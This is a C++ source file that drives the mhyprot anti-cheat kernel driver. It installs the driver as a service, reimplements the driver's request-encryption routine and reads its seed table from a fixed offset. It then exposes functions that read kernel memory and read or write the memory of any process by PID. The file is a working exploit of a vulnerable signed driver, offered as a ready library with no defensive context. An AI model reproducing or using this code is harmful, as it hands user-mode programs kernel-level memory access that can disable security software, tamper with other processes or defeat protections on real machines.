#include <iostream>
#include <Windows.h>

#include "KernelModuleLookup.h"
#include "MhyDrvIO.h"

bool MhyDrvIO::InitDrv()
{
	bool result = this->ConnectDrv();

	if (!result) result = this->SetupDrv();

	if (!result) return false;
	//
	result &= this->InitSeedArray();
	if (result) printf("drv init success.\n");
	return result;
}

void MhyDrvIO::UnloadDrv()
{
	printf("Unload Drv...\n");
	SC_HANDLE hSCManager = OpenSCManagerA(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	if (hSCManager == NULL) return;
	SC_HANDLE hService = OpenServiceA(hSCManager, this->serviceName, SC_MANAGER_ALL_ACCESS);
	if (hService == NULL) return;
	SERVICE_STATUS serviceStatus;
	ControlService(hService, SERVICE_CONTROL_STOP, &serviceStatus);

	if (hService) CloseServiceHandle(hService);
	if (hSCManager) CloseServiceHandle(hSCManager);
}

bool MhyDrvIO::ConnectDrv()
{
	printf("Connect Drv...\n");
	this->hDevice = CreateFileA(this->ioFileName, GENERIC_READ | GENERIC_WRITE, NULL, NULL, 3, NULL, NULL);
	return (this->hDevice != INVALID_HANDLE_VALUE);
}

bool MhyDrvIO::SetupDrv()
{
	printf("Setup Drv...\n");
	SC_HANDLE hSCManager = OpenSCManagerA(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	if (hSCManager == NULL) return false;
	SC_HANDLE hService = OpenServiceA(hSCManager, this->serviceName, SC_MANAGER_ALL_ACCESS);
	if (hService == NULL) hService = CreateServiceA(hSCManager, this->serviceName, this->serviceName, SC_MANAGER_ALL_ACCESS, SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE, this->drvFileName, NULL, NULL, NULL, NULL, NULL);
	bool result = StartServiceA(hService, 0, NULL);

	if (hService) CloseServiceHandle(hService);
	if (hSCManager) CloseServiceHandle(hSCManager);

	return result && this->ConnectDrv();
}

DWORD64 MhyDrvIO::GetKey(DWORD64 seed)
{
	DWORD64 cry_1 = ((((seed >> 29) & 0x555555555 ^ seed) & 0x38EB3FFFF6D3) << 17) ^ (seed >> 29) & 0x555555555 ^ seed;
	return ((cry_1 & 0xFFFFFFFFFFFFBF77u) << 37) ^ cry_1 ^ ((((cry_1 & 0xFFFFFFFFFFFFBF77u) << 37) ^ cry_1) >> 43);
}

void MhyDrvIO::CryptData(PVOID data, DWORD size)
{
	if (size % 8) throw "data size must be 8-byte alignment";
	if (size / 8 >= 312) throw "size can not support more than 312 * 8 bytes";
	DWORD cry_group_count = size / 8;
	PDWORD64 pdw64 = (PDWORD64)data;
	DWORD64 key_2_base = 0;
	for (DWORD i = 1; i < cry_group_count; i++)
	{
		pdw64[i] = pdw64[i] ^ this->GetKey(seedmap[i - 1]) ^ (key_2_base + pdw64[0]);
		key_2_base += 16;
	}
}

bool MhyDrvIO::IoControl(DWORD ControlCode, PVOID Data, DWORD Size)
{
	DWORD OutSize = 0;
	PVOID OutBuff = calloc(1, Size);
	if (!OutBuff) throw "out of memory";
	bool Ret = DeviceIoControl(hDevice, ControlCode, Data, Size, OutBuff, Size, &OutSize, 0);
	if (OutSize) memcpy(Data, OutBuff, OutSize);
	free(OutBuff);
	return Ret;
}

bool MhyDrvIO::InitSeedArray()
{
	printf("Init Seed Array...\n");
	InitSeedData initdata = { 0 };
	initdata.d2 = 0x0BAEBAEEC;
	initdata.q1 = 0x0EBBAAEF4FFF89042;
	this->IoControl(io_ctls.InitDrvSeedArray, &initdata, sizeof(initdata));
	
	DWORD64 drv_addr = LookupDriverBaseAddr(drvSysName);
	if (!drv_addr) throw "can not found drv base addr";
	printf("drv base addr : 0x%I64X\n", drv_addr);
	DWORD64 seedmap_addr = 0;
	this->ReadKernelMem(drv_addr + 0xA0E8, sizeof(seedmap_addr), &seedmap_addr);
	if (!seedmap_addr) throw "can not found seed map addr";
	this->ReadKernelMem(seedmap_addr, sizeof(seedmap), seedmap);
	return true;
}

bool MhyDrvIO::ReadKernelMem(DWORD64 addr, DWORD size, void* outBuff)
{
	if (!outBuff) throw "outBuff can not be null";
	DWORD buffsize = size + sizeof(DWORD);
	PReadKernelData pdata = (PReadKernelData)calloc(1, buffsize);
	if (!pdata) throw "out of memory";
	pdata->HeadData.KernelAddr = addr;
	pdata->Size = size;
	this->IoControl(io_ctls.ReadKernelMem, pdata, buffsize);
	if (!pdata->HeadData.result)
	{
		printf("Read kernel memory: 0x%I64X size: %d success.\n", addr, size);
		memcpy(outBuff, (PUCHAR)pdata + 4, size);
		return true;
	}
	printf("Read kernel memory: 0x%I64X size: %d failed.\n", addr, size);
	return false;
}
void PrintBuffer(void* pBuff, unsigned int nLen)
{
	if (NULL == pBuff || 0 == nLen)
	{
		return;
	}

	const int nBytePerLine = 16;
	unsigned char* p = (unsigned char*)pBuff;
	char szHex[3 * nBytePerLine + 1] = { 0 };

	printf("-----------------begin-------------------\n");
	for (unsigned int i = 0; i < nLen; ++i)
	{
		int idx = 3 * (i % nBytePerLine);
		if (0 == idx)
		{
			memset(szHex, 0, sizeof(szHex));
		}
#ifdef WIN32
		sprintf_s(&szHex[idx], 4, "%02x ", p[i]);// buff长度要多传入1个字节
#else
		snprintf(&szHex[idx], 4, "%02x ", p[i]); // buff长度要多传入1个字节
#endif

		// 以16个字节为一行，进行打印
		if (0 == ((i + 1) % nBytePerLine))
		{
			printf("%s\n", szHex);
		}
	}

	// 打印最后一行未满16个字节的内容
	if (0 != (nLen % nBytePerLine))
	{
		printf("%s\n", szHex);
	}

	printf("------------------end-------------------\n");
}

bool MhyDrvIO::ReadProcMem(DWORD pid, DWORD64 addr, DWORD size, void* outBuff)
{
	bool ret = 0;
	memset(outBuff, 0x22, size-1);


	ReadWriteProcData readData = { 0 };
	readData.Action = 0; //0 for read
	readData.PID = pid;
	readData.SrcAddr = addr;
	readData.DestAddr = (DWORD64)outBuff;
	readData.Size = size;

	this->CryptData(&readData, sizeof(readData));

	this->IoControl(io_ctls.RWProcMem, &readData, sizeof(readData));
	if (size >10)
	{
		size_t i = 0;
		for (; i < 10; i++)
		{
			if (!(((char*)outBuff)[i] == 0x22))
			{
				break;
			}
		}
		if (i == 10)
		{
			//失败
			ret = 1;
		}
		else
		{
			//成功
			ret = 0;
		}
	}
	//PrintBuffer(outBuff, 10);
	return ret;
}

bool MhyDrvIO::WriteProcMem(DWORD pid, DWORD64 addr, DWORD size, void* inBuff)
{
	ReadWriteProcData readData = { 0 };
	readData.Action = 1; //1 for write
	readData.PID = pid;
	readData.SrcAddr = (DWORD64)inBuff;
	readData.DestAddr = addr;
	readData.Size = size;

	this->CryptData(&readData, sizeof(readData));

	this->IoControl(io_ctls.RWProcMem, &readData, sizeof(readData));
	return true;
}